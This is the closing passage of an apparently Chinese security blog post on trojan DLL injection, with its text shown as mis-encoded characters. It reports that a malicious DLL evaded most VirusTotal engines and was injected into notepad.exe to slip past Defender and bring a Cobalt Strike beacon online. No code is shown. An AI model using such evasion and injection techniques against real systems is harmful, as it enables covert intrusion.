</span></span></code></pre></td></tr></table></div></div><h3 id=æµ‹è¯•ç»“æœ>æµ‹è¯•ç»“æœ<a hidden class=anchor aria-hidden=true href=#æµ‹è¯•ç»“æœ>#</a></h3><h4 id=dll-vtæ£€æµ‹ç»“æœ-275>dll VTæ£€æµ‹ç»“æœ 2/75<a hidden class=anchor aria-hidden=true href=#dll-vtæ£€æµ‹ç»“æœ-275>#</a></h4><p><img loading=lazy src=/postPic/img_20240816151048.png alt=åŠ è½½å¤±è´¥></p><h4 id=æ³¨å…¥notepadexeç»•è¿‡-df-ä¸Šçº¿-cs-å¼¹å‡ºè®¡ç®—å™¨>æ³¨å…¥<code>notepad.exe</code>ï¼Œç»•è¿‡ df ä¸Šçº¿ cs å¼¹å‡ºè®¡ç®—å™¨<a hidden class=anchor aria-hidden=true href=#æ³¨å…¥notepadexeç»•è¿‡-df-ä¸Šçº¿-cs-å¼¹å‡ºè®¡ç®—å™¨>#</a></h4><p><img loading=lazy src=/postPic/img_20240816151306.png alt=åŠ è½½å¤±è´¥></p><p>ä¹Ÿèƒ½æ³¨å…¥<code>explorer.exe</code>ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯æ³¨å…¥ä¸€æ¬¡è¿‡åï¼Œéœ€è¦é‡å¯æ‰èƒ½æ³¨å…¥ç¬¬äºŒæ¬¡ã€‚</p><h3 id=credicts>credicts<a hidden class=anchor aria-hidden=true href=#credicts>#</a></h3><p><code>https://payloads.online/archivers/2023-09-08/vscode-dll/</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=http://3lizabeth.fun/tags/%E6%9C%A8%E9%A9%AC/>æœ¨é©¬</a></li><li><a href=http://3lizabeth.fun/tags/dll%E6%B3%A8%E5%85%A5/>Dllæ³¨å…¥</a></li></ul><nav class=paginav><a class=prev href=http://3lizabeth.fun/posts/articles/%E6%88%91%E5%9C%A8%E5%8C%97%E4%BA%AC/><span class=title>Â« ä¸Šä¸€é¡µ</span><br><span>æˆ‘åœ¨åŒ—äº¬</span>
</a><a class=next href=http://3lizabeth.fun/posts/study/server_basic_build/><span class=title>ä¸‹ä¸€é¡µ Â»</span><br><span>clash-for-Linuxçš„ç®€å•é…ç½®ä¸dockerå®‰è£…</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://3lizabeth.fun/>3lizabeth's Blog</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span><div class=busuanzi-footer><span id=busuanzi_container_site_pv>æœ¬ç«™æ€»è®¿é—®é‡<span id=busuanzi_value_site_pv></span>æ¬¡
</span><span id=busuanzi_container_site_uv>æœ¬ç«™è®¿å®¢æ•°<span id=busuanzi_value_site_uv></span>äººæ¬¡</span></div></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="å¤åˆ¶";function s(){t.innerHTML="å·²å¤åˆ¶ï¼",setTimeout(()=>{t.innerHTML="å¤åˆ¶"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>